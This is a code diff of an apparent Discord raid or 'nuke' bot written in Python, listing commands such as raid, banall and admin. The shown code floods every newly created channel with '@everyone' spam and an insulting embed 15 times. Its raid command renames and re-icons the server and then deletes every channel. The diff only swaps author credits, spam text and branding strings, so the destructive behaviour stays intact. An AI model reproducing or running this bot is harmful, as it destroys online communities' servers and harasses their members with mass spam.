@@ -44,14 +44,14 @@ async def on_ready():
 comandos :           >raid >mr >dr 
                      >admin >banall >nc >dc
 prefix: >    
-                                 by hades''')
+                                 by azkeel''')
 
-spam=("@everyone https://discord.gg/vx9tbwTEHC             https://discord.gg/MGXTMezXAv "
+spam=("@everyone spam"
      )
 @bot.event
 async def on_guild_channel_create(channel):
  for i in range(0,15):
-   embed=discord.Embed(title="Fucked By System32", color=discord.Color.darker_grey())
+   embed=discord.Embed(title="Fucked By servername", color=discord.Color.darker_grey())
    embed.set_image(url="https://i.pinimg.com/originals/70/e7/e3/70e7e3acc945029b238bc2e62e7c8647.gif")
    await channel.send(spam,embed=embed)
    
@@ -59,7 +59,7 @@ async def on_guild_channel_create(channel):
 async def raid(ctx):
  nombre = "!Fυƈƙҽԃ"
  await ctx.message.delete()
- await ctx.guild.edit(name = '!Fυƈƙҽԃ By System',icon=icon)
+ await ctx.guild.edit(name = '!Fυƈƙҽԃ By spamname',icon=icon)
  for channel in ctx.guild.channels:
   try:
    await channel.delete()
